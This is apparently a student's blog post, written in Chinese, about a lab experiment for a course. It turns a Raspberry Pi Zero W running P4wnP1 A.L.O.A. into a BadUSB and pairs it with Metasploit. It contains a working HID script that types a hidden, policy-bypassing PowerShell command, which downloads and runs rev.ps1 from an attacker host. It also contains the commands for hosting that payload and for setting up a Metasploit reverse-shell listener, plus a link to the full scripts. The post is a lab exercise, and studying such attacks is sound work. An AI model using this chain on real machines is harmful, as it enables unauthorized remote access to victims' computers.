---
title: badusb实验：一次将p4wnp1_aloa和metasploit结合利用的尝试
date: 2026-08-06
tags: [树莓派,近源攻击]
categories: 安全
---


# badusb实验：一次将p4wnp1_aloa和metasploit结合利用的尝试

起因是在放假之前，专业课老师留了一个期末作业，要求利用社会工程学复现攻击。在做作业的时候突发奇想，我的手边刚好有一个树莓派zerow，结合p4wnp1_aloa的项目可以进行一次badusb的实验。

先搞一个usb连接板把它和树莓派zerow装在一起，长这样（手机像素拍摄出来的效果不好）

![image](/images/badusb实验：一次将p4wnp1aloa和metasploit结合利用的尝试/img_1.jpeg)
![image](/images/badusb实验：一次将p4wnp1aloa和metasploit结合利用的尝试/img_2.jpeg)

另外还需要一个SD卡和一个读卡器，用来烧录系统，这里用的是一张16gb的SD卡。把SD卡插入读卡器连接电脑，首先要对SD卡进行格式化，这里使用SD Card Formatter来进行格式化

![image](/images/badusb实验：一次将p4wnp1aloa和metasploit结合利用的尝试/img_3.png)

从github仓库里下载p4wnp1_aloa的镜像，大概1.1GB，直接访问下载可能很慢，可以尝试用minecraft的pcl启动器下载，速度会有提升

下载完成后使用树莓派的烧录软件Raspberry Pi Imager来烧录系统。进入之后选择Raspberry Pi Zero，系统选择使用自定义镜像选择好镜像和设备，等待烧录完成即可

![image](/images/badusb实验：一次将p4wnp1aloa和metasploit结合利用的尝试/img_4.png)

注意插入电脑烧录系统时一定要插到电脑读写速度快的那个usb插口（一开始我用的是慢的口烧录了3次全部失败，换速度快的另一个usb口一次成功(╥﹏╥)）

将烧录好系统的卡插到树莓派上再插入电脑，等待树莓派开机，系统准备好后可以找到一个p4wnp1的wifi

![image](/images/badusb实验：一次将p4wnp1aloa和metasploit结合利用的尝试/img_5.png)

连接wifi后访问172.24.0.1:8000就可以进入p4wnp1的配置界面

![image](/images/badusb实验：一次将p4wnp1aloa和metasploit结合利用的尝试/img_6.png)

进入WIFI SETTINGS先来配置网络连接模式，选择**Client with Failover to AP**，这个模式能让树莓派先连接已有的wifi，如果失败再开启自己的wifi。填入wifi的SSID和密码，这里用的是我手机的热点，保存成startup后重启一下就可以让树莓派连接到手机热点来访问网络了

![image](/images/badusb实验：一次将p4wnp1aloa和metasploit结合利用的尝试/img_7.png)

树莓派接入网络后的ip变成了172.16.0.1，用ssh来连接测试一下，密码默认toor

```
> ssh root@172.16.0.1
The authenticity of host '172.16.0.1 (172.16.0.1)' can't be established.
ED25519 key fingerprint is SHA256:IDIeCSXhsACXVfhHQKKFaqsQQq5MsEdINh0hbRPYm9Q.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '172.16.0.1' (ED25519) to the list of known hosts.
root@172.16.0.1's password:
Linux kali 4.14.80-Re4son+ #1 Thu Feb 6 15:03:43 CET 2020 armv6l

The programs included with the Kali GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Kali GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
root@kali:~#
```

这样整个p4wnp1就可以直接使用了。对于具体的攻击，github上有开源的项目P4wnP1-A.L.O.A.-Payloads，但是我在我自己的环境测试的时候总是失败，我找了各种各样的payload脚本，总是会在模拟键鼠输入时出各种问题，所以我才想到结合metasploit来进行攻击测试

```
P4wnP1 A.L.O.A Payloads链接:https://github.com/NightRang3r/P4wnP1-A.L.O.A.-Payloads
```

结合现代的vibe coding技术，整出来了一个适用我的实验环境的使用metasploit来连接shell的方案，大概就是在攻击机上开个端口放木马，然后让badusb模拟键鼠下载木马执行，利用木马来反弹shell。在HID脚本（staged_shell.js）中是利用的80端口

```
// ===== CONFIG =====
var LISTENER_IP = "192.168.xxx.xxx";  // Kali 攻击机 IP
var HTTP_PORT = "80";                  // HTTP 服务器端口
// ==================

layout("US");
typingSpeed(0,0);

// 打开运行窗口
press("GUI r");
delay(500);

// PowerShell 下载并执行
type("powershell -nop -w hidden -ep bypass -c \"IEX(New-Object Net.WebClient).DownloadString('http://" + LISTENER_IP + ":" + HTTP_PORT + "/rev.ps1')\"");
delay(300);

press("ENTER");
```

完整的脚本和需要的文件我都放在一个github仓库里了

```
shellofP4wnP1 learn链接：https://github.com/renge1145141919810/shellofP4wnP1-learn-
```

回到p4wnp1，我们先来确定一下p4wnp1能够连接外网，尝试ping百度

![image](/images/badusb实验：一次将p4wnp1aloa和metasploit结合利用的尝试/img_8.png)

能ping通，说明可以连接外网了。那我们可以把之前搞的仓库克隆下来进行部署，对于树莓派的部署也比较简单，核心就是一个rev.ps1文件和HID脚本。在HID脚本**staged_shell.js**中写好攻击机的ip后放到 **/usr/local/P4wnP1/HIDScripts**目录下就行

```
root@kali:~/tempofshell/hid_scripts# cd /usr/local/P4wnP1/HIDScripts
root@kali:/usr/local/P4wnP1/HIDScripts# cp ~/tempofshell/hid_scripts/staged_shell.js ./
root@kali:/usr/local/P4wnP1/HIDScripts# ls
cosmouse.js  helper.js  hidtest1.js  mousejiggle.js  ms_snake.js  sinmouse.js  staged_shell.js  wifi_covert_channel.js
```

浏览器访问172.16.0.1:8000进行配置，进入trigger actions，选择add one，Trigger选择USB gadget connected to host，Action选择start a HIDScript，Script name选择staged_shell.js

![image](/images/badusb实验：一次将p4wnp1aloa和metasploit结合利用的尝试/img_9.png)

保存成startup之后就行

准备工作已经做完，接下来要进行完整的攻击流程。这里我的靶机是一台windows sever2019虚拟机，攻击机则是一台kali linux虚拟机。实现攻击最重要的就是那个rev.ps1文件，我们需要先把它放到我们kali用于启动网站服务的目录下面，也就是 **/var/www/html**。完成后启动http服务

```
cp rev.ps1 /var/www/html
cd /var/www/html && python3 -m http.server 80
```

然后我们新开一个终端窗口开启msf，选择使用exploit/multi/handler

```
use exploit/multi/handler
```

payload我们选择windows/x64/shell_reverse_tcp

```
set payload windows/x64/shell_reverse_tcp
```

设置好LHOST和LPORT后开启监听

![image](/images/badusb实验：一次将p4wnp1aloa和metasploit结合利用的尝试/img_10.png)

来到windows sever，插入做好的badusb，由于是树莓派做的，每次插入都需要重新启动一遍系统，所以需要等大概40秒钟左右。系统启动后会执行脚本，能看到命令框闪了一下，回到kali就可以看见拿到的会话shell了

![image](/images/badusb实验：一次将p4wnp1aloa和metasploit结合利用的尝试/img_11.png)


### 可能需要的资源链接
**P4wnP1_aloa链接：https://github.com/RoganDawes/P4wnP1_aloa/releases/tag/v0.1.1-beta**
**P4wnP1-A.L.O.A payloads链接：https://github.com/NightRang3r/P4wnP1-A.L.O.A.-Payloads**
**shellofp4wnp1-learn-链接：https://github.com/renge1145141919810/shellofP4wnP1-learn-**